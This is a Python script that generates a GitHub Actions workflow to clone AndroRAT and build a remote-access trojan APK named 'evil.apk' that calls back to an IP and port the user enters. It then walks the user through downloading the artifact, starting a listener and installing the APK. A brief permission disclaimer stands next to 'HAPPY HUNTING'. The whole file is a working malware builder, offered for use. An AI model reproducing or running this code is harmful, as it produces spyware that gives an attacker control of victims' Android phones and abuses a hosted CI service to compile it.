import os
import time
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def print_message(message, color=Fore.WHITE):
    print(color + message + Style.RESET_ALL)

def create_workflow_file(ip_address, port_number):
    # Define the path for the workflow file
    workflow_dir = '.github/workflows'
    workflow_file = os.path.join(workflow_dir, 'main.yml')
    
    # Define the content for the workflow file with placeholders replaced
    setup_code = f"""
name: AndroRAT Setup

on:
  push:
    branches:
      - main

jobs:
  setup:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v3

    - name: Update System Packages
      run: |
        sudo apt update
        sudo apt upgrade -y

    - name: Install Java Development Kit (JDK)
      run: |
        sudo apt install -y openjdk-11-jdk

    - name: Install Git
      run: |
        sudo apt install -y git

    - name: Install Android SDK
      run: |
        sudo apt install -y android-sdk

    - name: Clone AndroRAT Repository
      run: |
        git clone https://github.com/karma9874/AndroRAT.git
        cd AndroRAT

    - name: Install Python and pip
      run: |
        sudo apt install -y python3 python3-pip

    - name: Install Python Dependencies
      run: |
        cd AndroRAT
        pip3 install -r requirements.txt

    - name: Install Additional Tools (Optional)
      run: |
        sudo apt install -y apktool 

    - name: Build AndroRAT Payload
      run: |
        cd AndroRAT
        python3 androRAT.py --build -i {ip_address} -p {port_number} -o evil.apk

    - name: Upload evil.apk
      uses: actions/upload-artifact@v3
      with:
        name: evil-apk
        path: AndroRAT/evil.apk
    """

    # Create the .github/workflows directory if it does not exist
    if not os.path.exists(workflow_dir):
        os.makedirs(workflow_dir)

    # Write the setup code to the workflow file
    with open(workflow_file, 'w') as file:
        file.write(setup_code)

    print_message(f"Workflow file created at {workflow_file}", Fore.GREEN)

def main():
    print_message("First, login or create a GitHub account.", Fore.YELLOW)

    user_input = input("Have you logged in or created an account? (y/n): ").strip().lower()
    if user_input == 'y':
        print_message("Proceeding with setup...", Fore.CYAN)
        
        # Prompt user for IP address and port number
        ip_address = input("Enter the IP address for the payload: ").strip()
        port_number = input("Enter the port number for the payload: ").strip()
        
        # Validate IP address and port number format (basic validation)
        if not ip_address or not port_number.isdigit():
            print_message("Invalid IP address or port number. Please try again.", Fore.RED)
            return
        
        create_workflow_file(ip_address, port_number)
        
        print_message("Once the GitHub Actions workflow runs successfully, you can download the APK file from the GitHub Actions artifacts section.", Fore.GREEN)
        print_message("To download the APK file:", Fore.GREEN)
        print_message("1. Go to your repository on GitHub.", Fore.GREEN)
        print_message("2. Click on the 'Actions' tab.", Fore.GREEN)
        print_message("3. Select the most recent workflow run.", Fore.GREEN)
        print_message("4. Click on the 'Artifacts' section to download the 'evil-apk' file.", Fore.GREEN)
        
        print_message("Reminder: Ensure you have explicit permission to exploit any Android device.", Fore.RED)
        print_message("Exploiting devices without permission is illegal and unethical. Only perform these actions in a controlled and authorized environment.", Fore.RED)
        time.sleep(3)
        print_message("HAPPY HUNTING", Fore.GREEN)
        print_message("Edit IP and port in tcp_listener.py then run python3 tcp_listener.py and install apk to exploit your phone.", Fore.YELLOW)

    else:
        print_message("Please complete the login or account creation process and try again.", Fore.RED)

if __name__ == "__main__":
    main()
